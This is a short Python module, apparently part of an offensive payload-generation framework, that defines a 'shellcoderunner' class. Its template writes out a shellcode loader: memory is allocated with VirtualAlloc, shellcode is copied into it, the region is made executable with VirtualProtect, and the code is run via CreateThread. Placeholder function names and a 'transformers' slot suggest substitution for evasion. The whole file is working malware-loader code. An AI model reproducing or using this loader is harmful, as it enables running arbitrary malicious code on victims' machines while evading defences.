from string import Template
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['local c = require "c"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
    {transformers}

    local address = {VirtualAlloc}(c.NULL, {shellcodeSize}, 0x3000, 0x04)
    local ptr = c.Pointer(shellcode[0])

    {RtlMoveMemory}(address, ptr, {shellcodeSize})

    local oldProtect = c.uint32_t()
    {VirtualProtect}(address, {shellcodeSize}, 0x40, c.Pointer(oldProtect))
    
    local thread = {CreateThread}(c.NULL, 0, address, c.NULL, 0, c.NULL)
    {WaitForSingleObject}(thread, 0xffffffff)
"""